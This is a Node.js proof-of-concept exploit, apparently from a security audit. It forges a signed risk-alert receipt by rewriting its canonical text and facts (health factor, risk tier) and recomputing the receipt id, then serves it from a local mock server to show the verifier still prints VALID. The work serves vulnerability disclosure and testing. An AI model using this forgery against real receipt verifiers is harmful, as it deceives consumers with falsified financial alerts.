// PoC 4 — verify-midas-alert.mjs checks sha256(canonical) against the RECEIPT's own receipt_id, but checks
// the signed served_message against the id from ARGV. Nothing ties the two together, so a receipt whose
// `canonical` (and `facts`) were rewritten — with receipt_id recomputed — still prints VALID as long as it
// carries the genuine signature for the requested id. `facts` (what a webhook consumer reads) is never
// compared with `canonical` at all. Runs against a LOCAL mock server (no production traffic):
// the mirror/CDN/receipt-store is the attacker; the key directory served is the genuine epoch-3 fixture.
import http from 'node:http';
import { readFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { spawnSync } from 'node:child_process';
import { verdict } from './_common.mjs';

const fx = JSON.parse(readFileSync(new URL('../python/tests/fixtures/midas-alert-fe62b072.json', import.meta.url)));
const dir = readFileSync(new URL('../python/tests/fixtures/x402-receipt-keys-epoch3.json', import.meta.url));
const sha = (s) => createHash('sha256').update(s, 'utf8').digest('hex');
const ID = fx.receipt_id;
const forgedCanonical = fx.canonical.replace('health_factor=1.000872452215302', 'health_factor=4.2').replace('risk_tier=critical', 'risk_tier=safe');
const forged = { ...fx, canonical: forgedCanonical, receipt_id: sha(forgedCanonical), facts: { ...fx.facts, health_factor: 4.2, risk_tier: 'safe' } };

const run = (receipt) => new Promise((resolve) => {
  const srv = http.createServer((req, res) => {
    res.setHeader('content-type', 'application/json');
    res.end(req.url.startsWith('/.well-known/') ? dir : JSON.stringify(receipt));
  }).listen(0, '127.0.0.1', () => {
    const base = `http://127.0.0.1:${srv.address().port}`;
    // spawnSync would block the server's event loop → run async
    import('node:child_process').then(({ spawn }) => {
      const p = spawn(process.execPath, ['../verifier/verify-midas-alert.mjs', ID], { env: { ...process.env, FRACTALAI_BASE: base }, cwd: new URL('.', import.meta.url).pathname });
      let out = ''; p.stdout.on('data', (d) => (out += d)); p.stderr.on('data', (d) => (out += d));
      p.on('close', (code) => { srv.close(); resolve({ code, out }); });
    });
  });
});

const g = await run(fx);
console.log('genuine receipt  → exit', g.code, g.out.trim().split('\n').pop());
const f = await run(forged);
console.log('forged canonical → exit', f.code, f.out.trim().split('\n').pop());
const vuln = verdict(f.code === 0, `canonical says health_factor=4.2 / risk_tier=safe (FractalAI signed 1.0009 / critical) and the verifier prints VALID`);
process.exit(vuln ? 1 : 0);
